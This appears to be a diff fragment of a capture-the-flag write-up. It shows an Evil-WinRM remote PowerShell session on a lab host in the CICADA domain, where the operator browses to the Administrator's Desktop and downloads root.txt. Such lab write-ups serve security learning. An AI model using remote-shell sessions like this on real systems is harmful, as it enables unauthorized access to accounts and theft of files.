@@ -649,5 +649,56 @@ Warning: Remote path completions is disabled due to ruby limitation: quoting_det
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                         
 Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> 
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd ..
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> ls
+
+
+    Directory: C:\Users\emily.oscars.CICADA
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-r---         8/28/2024  10:32 AM                Desktop
+d-r---         8/22/2024   2:22 PM                Documents
+d-r---          5/8/2021   1:20 AM                Downloads
+d-r---          5/8/2021   1:20 AM                Favorites
+d-r---          5/8/2021   1:20 AM                Links
+d-r---          5/8/2021   1:20 AM                Music
+d-r---          5/8/2021   1:20 AM                Pictures
+d-----          5/8/2021   1:20 AM                Saved Games
+d-r---          5/8/2021   1:20 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd ..
+*Evil-WinRM* PS C:\Users> ls
+
+
+    Directory: C:\Users
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         8/26/2024   1:10 PM                Administrator
+d-----         8/22/2024   2:22 PM                emily.oscars.CICADA
+d-r---         3/14/2024   3:45 AM                Public
+
+
+*Evil-WinRM* PS C:\Users> cd Administrator
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         12/6/2024   1:27 AM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> download root.txt
+                                        
+Info: Downloading C:\Users\Administrator\Desktop\root.txt to root.txt
+                                        
+Info: Download successful!
 ```
